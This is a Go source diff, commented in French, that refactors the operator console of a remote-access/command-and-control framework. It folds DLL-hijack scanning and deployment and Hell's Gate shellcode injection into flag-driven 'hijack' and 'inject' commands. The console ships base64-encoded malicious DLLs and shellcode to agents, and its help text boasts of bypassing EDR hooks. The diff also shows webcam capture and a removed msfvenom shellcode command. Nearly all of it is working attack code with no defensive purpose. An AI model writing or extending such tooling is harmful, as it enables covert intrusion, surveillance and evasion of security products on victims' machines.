@@ -29,11 +29,13 @@ import (
 	"bytes"
 	"encoding/base64"
 	"encoding/json"
+	"flag"
 	"fmt"
 	"io"
 	"net/http"
 	"os"
 	"path/filepath"
+	"strconv"
 	"strings"
 	"time"
 )
@@ -177,26 +179,16 @@ func (c *Console) handleCommand(cmd string, args []string) error {
 			return fmt.Errorf("usage: download <remote_path>")
 		}
 		return c.cmdTask("download", args[0])
-	case "hijack_scan":
+	case "hijack":
 		if c.ActiveAgent == "" {
 			return fmt.Errorf("aucun agent sélectionné")
 		}
-		return c.cmdTask("hijack_scan", "")
-	case "hijack_deploy":
-		if c.ActiveAgent == "" || len(args) == 0 {
-			return fmt.Errorf("usage: hijack_deploy <chemin_local_vers_dll>")
+		return c.cmdHijack(args)
+	case "inject":
+		if c.ActiveAgent == "" {
+			return fmt.Errorf("aucun agent sélectionné")
 		}
-		return c.cmdHijackDeploy(args[0])
-	case "hellsgate":
-		if c.ActiveAgent == "" || len(args) < 2 {
-			return fmt.Errorf("usage: hellsgate <pid> <chemin_shellcode_local>")
-		}
-		return c.cmdHellsGate(args[0], args[1])
-	case "hellsgate_local":
-		if c.ActiveAgent == "" || len(args) == 0 {
-			return fmt.Errorf("usage: hellsgate_local <chemin_shellcode_local>")
-		}
-		return c.cmdHellsGateLocal(args[0])
+		return c.cmdInject(args)
 	case "webcam":
 		if c.ActiveAgent == "" {
 			return fmt.Errorf("aucun agent sélectionné")
@@ -353,68 +345,127 @@ func (c *Console) cmdTask(taskType, payload string) error {
 	return nil
 }
 
-// cmdHijackDeploy — lit une DLL locale, l'encode en base64 et l'envoie à l'agent
-func (c *Console) cmdHijackDeploy(dllPath string) error {
-	data, err := os.ReadFile(dllPath)
-	if err != nil {
-		return fmt.Errorf("impossible de lire la DLL locale: %v", err)
+// cmdHijack — unifie le scan et le déploiement de DLL via des flags
+//
+// Usage: hijack --scan
+//        hijack --deploy --file <chemin_dll>
+func (c *Console) cmdHijack(args []string) error {
+	fs := flag.NewFlagSet("hijack", flag.ContinueOnError)
+	scanPtr := fs.Bool("scan", false, "Scanner les cibles de DLL hijacking")
+	deployPtr := fs.Bool("deploy", false, "Déployer une DLL malveillante")
+	filePtr := fs.String("file", "", "Chemin local vers la DLL (pour --deploy)")
+	filePtrShort := fs.String("f", "", "Chemin local vers la DLL (pour --deploy)")
+
+	if err := fs.Parse(args); err != nil {
+		return err
 	}
 
-	encoded := base64.StdEncoding.EncodeToString(data)
+	if *scanPtr {
+		fmt.Println("[*] Lancement du scan de vulnérabilités DLL hijacking...")
+		// JSON payload structure: {"action": "scan"}
+		payloadBytes, _ := json.Marshal(map[string]string{
+			"action": "scan",
+		})
+		return c.cmdTask("hijack", string(payloadBytes))
+	}
 
-	fmt.Printf("[*] Envoi de la DLL (%d bytes)...", len(data))
-	return c.cmdTask("hijack_deploy", encoded)
+	if *deployPtr {
+		filePath := *filePtr
+		if filePath == "" {
+			filePath = *filePtrShort
+		}
+		if filePath == "" {
+			return fmt.Errorf("vous devez spécifier le chemin de la DLL avec -f ou --file")
+		}
+
+		data, err := os.ReadFile(filePath)
+		if err != nil {
+			return fmt.Errorf("impossible de lire la DLL locale: %v", err)
+		}
+
+		encoded := base64.StdEncoding.EncodeToString(data)
+		fmt.Printf("[*] Envoi de la DLL (%d bytes)...\n", len(data))
+
+		// JSON payload structure: {"action": "deploy", "dll_base64": "..."}
+		payloadBytes, _ := json.Marshal(map[string]string{
+			"action":     "deploy",
+			"dll_base64": encoded,
+		})
+		return c.cmdTask("hijack", string(payloadBytes))
+	}
+
+	return fmt.Errorf("usage: hijack [--scan] [--deploy -f <chemin>]")
 }
 
-// cmdHellsGate — injection distante via direct syscalls (Hell's Gate)
+// cmdInject — commande unifiée d'injection avec flags
 //
-// Lit un fichier shellcode .bin local, l'encode en base64,
-// et l'envoie à l'agent avec le PID cible.
-// L'agent résoudra les SSN dynamiquement et exécutera les syscalls
-// directement sans passer par les hooks EDR de ntdll.dll.
-func (c *Console) cmdHellsGate(pidStr, shellcodePath string) error {
-	// Vérifier le PID
-	if _, err := fmt.Sscanf(pidStr, "%s", &pidStr); err != nil {
-		return fmt.Errorf("PID invalide: %s", pidStr)
+// Usage: inject -m <method> [-p pid] -f <file>
+func (c *Console) cmdInject(args []string) error {
+	fs := flag.NewFlagSet("inject", flag.ContinueOnError)
+	methodPtr := fs.String("m", "", "Méthode d'injection: hellsgate, local")
+	methodLongPtr := fs.String("method", "", "Méthode d'injection: hellsgate, local")
+	pidPtr := fs.String("p", "", "PID cible (requis sauf pour method=local)")
+	pidLongPtr := fs.String("pid", "", "PID cible")
+	filePtr := fs.String("f", "", "Chemin local vers le shellcode (.bin)")
+	fileLongPtr := fs.String("file", "", "Chemin local vers le shellcode (.bin)")
+
+	if err := fs.Parse(args); err != nil {
+		return err
 	}
 
-	// Lire le shellcode depuis le fichier local
-	data, err := os.ReadFile(shellcodePath)
+	method := *methodPtr
+	if method == "" {
+		method = *methodLongPtr
+	}
+	pidStr := *pidPtr
+	if pidStr == "" {
+		pidStr = *pidLongPtr
+	}
+	file := *filePtr
+	if file == "" {
+		file = *fileLongPtr
+	}
+
+	if method == "" || file == "" {
+		return fmt.Errorf("usage: inject -m <method> [-p <pid>] -f <file>")
+	}
+
+	data, err := os.ReadFile(file)
 	if err != nil {
-		return fmt.Errorf("impossible de lire le shellcode: %v", err)
+		return fmt.Errorf("impossible de lire le fichier shellcode: %v", err)
 	}
-
-	// Encoder en base64 et construire le payload : "pid:base64_shellcode"
-	encoded := base64.StdEncoding.EncodeToString(data)
-	payload := fmt.Sprintf("%s:%s", pidStr, encoded)
-
-	fmt.Printf("[*] Hell's Gate — Injection directe via syscalls\n")
-	fmt.Printf("    PID cible    : %s\n", pidStr)
-	fmt.Printf("    Shellcode    : %s (%d bytes)\n", shellcodePath, len(data))
-	fmt.Printf("    Technique    : Direct syscalls (bypass hooks ntdll)\n")
-	fmt.Printf("[*] Envoi de la tâche...\n")
-
-	return c.cmdTask("hellsgate", payload)
-}
-
-// cmdHellsGateLocal — self-injection via direct syscalls
-//
-// Exécute le shellcode dans le processus de l'agent lui-même.
-// Utile pour charger un reflective DLL loader ou un beacon second-stage.
-func (c *Console) cmdHellsGateLocal(shellcodePath string) error {
-	data, err := os.ReadFile(shellcodePath)
-	if err != nil {
-		return fmt.Errorf("impossible de lire le shellcode: %v", err)
-	}
-
 	encoded := base64.StdEncoding.EncodeToString(data)
 
-	fmt.Printf("[*] Hell's Gate — Self-injection via syscalls directs\n")
-	fmt.Printf("    Shellcode : %s (%d bytes)\n", shellcodePath, len(data))
-	fmt.Printf("    Cible     : Processus agent (self-inject)\n")
-	fmt.Printf("[*] Envoi de la tâche...\n")
+	var pid uint32 = 0
+	if method != "local" {
+		if pidStr == "" {
+			return fmt.Errorf("vous devez spécifier un PID cible avec -p")
+		}
+		parsed, err := strconv.ParseUint(pidStr, 10, 32)
+		if err != nil {
+			return fmt.Errorf("PID invalide: %s", pidStr)
+		}
+		pid = uint32(parsed)
+	}
 
-	return c.cmdTask("hellsgate_local", encoded)
+	fmt.Printf("[*] Injection — Méthode: %s\n", method)
+	if method != "local" {
+		fmt.Printf("    PID cible : %d\n", pid)
+	}
+	fmt.Printf("    Fichier   : %s (%d bytes)\n", file, len(data))
+	fmt.Println("[*] Envoi de la tâche...")
+
+	// JSON payload structure: {"method": "hellsgate", "pid": 1234, "shellcode": "..."}
+	payloadMap := map[string]interface{}{
+		"method":    method,
+		"shellcode": encoded,
+	}
+	if pid > 0 {
+		payloadMap["pid"] = pid
+	}
+	
+	payloadBytes, _ := json.Marshal(payloadMap)
+	return c.cmdTask("inject", string(payloadBytes))
 }
 
 // cmdWebcam — demande une capture webcam à l'agent et sauvegarde le JPEG localement
@@ -798,21 +849,17 @@ func (c *Console) printHelp() {
     interactive         Mode shell pseudo-interactif (sleep 1s)
     kill                Terminer l'agent
 
-  DLL Hijacking :
-    hijack_scan         Rechercher des cibles de DLL hijacking
-    hijack_deploy <dll> Déployer une DLL malveillante
-
-  Hell's Gate (Direct Syscalls) :
-    hellsgate <pid> <shellcode.bin>     Injection distante via syscalls directs
-    hellsgate_local <shellcode.bin>     Self-injection via syscalls directs
+  Evasion & Privilege Escalation :
+    hijack --scan                    Scanner les cibles de DLL hijacking
+    hijack --deploy -f <dll>         Déployer une proxy DLL malveillante
+    inject -m hellsgate -p <pid> -f <sc.bin>    Injection shellcode (Direct Syscalls)
+    inject -m local -f <sc.bin>                 Self-injection (Direct Syscalls)
 
   Tips :
     - Les IDs peuvent être abrégés (8 premiers caractères)
     - Les tâches sont asynchrones — l'agent les récupère au prochain beacon
     - Utiliser 'tasks' pour voir les résultats
-    - 'webcam' sauvegarde automatiquement le JPEG dans le répertoire courant
-    - Hell's Gate bypass les hooks ntdll des EDR (CrowdStrike, SentinelOne...)
-    - Générer un shellcode : msfvenom -p windows/x64/exec CMD=calc.exe -f raw -o sc.bin
+    - L'injection Hell's Gate bypass les hooks ntdll des EDR
 `
 	fmt.Println(help)
 
